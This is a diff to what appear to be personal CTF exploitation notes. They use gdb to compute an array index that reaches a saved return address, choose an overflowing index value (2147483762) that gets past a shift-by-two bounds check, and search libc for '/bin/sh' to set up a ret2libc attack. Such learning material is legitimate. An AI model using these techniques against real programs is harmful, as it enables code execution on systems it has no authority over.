@@ -166,22 +166,6 @@ where the array_ptr is located when value retrieval
 (gdb) x/x $ebp+8
 0xffffd500:	0xffffd524 <==
 
-----
-we dont need to step in the read func
-
-only in the main we could get the &array when loaded
-
-   0x08048924 <main+513>:	lea    0x24(%esp),%eax
-   0x0804892b <main+520>:	call   0x80486d7 <read_number>
-   
- (gdb) x/x $esp+0x24
-0xffffd524
-
-p/d (0xffffd6ec - 0xffffd524) / 4 = 114
-python3 -c "print('{0:032b}'.format(114))"
-
-----
-
 0xffffd524 + 7*4 = 0xffffd540
 p *(int *)0xffffd540 = 123
 ```
@@ -204,6 +188,24 @@ printf %032d 1110010
 00000000000000000000000001110010
 since the index is `shl by $0x2` will get rid of the 2 MSB
 10000000000000000000000001110010 = 2147483762
+```
+```
+----
+we dont need to step in the read func
+
+only in the main we could get the &array when loaded
+
+   0x08048924 <main+513>:	lea    0x24(%esp),%eax
+   0x0804892b <main+520>:	call   0x80486d7 <read_number>
+   
+ (gdb) x/x $esp+0x24
+0xffffd524
+
+p/d (0xffffd6ec - 0xffffd524) / 4 = 114
+python3 -c "print('{0:032b}'.format(114))"   = 00000000000000000000000001110010
+python3 -c "print(int('10000000000000000000000001110010',2))"  =  2147483762
+
+----
 ```
 ```
 (gdb) find 0xf7e2c000 , 0xf7fcc000 , "/bin/sh"
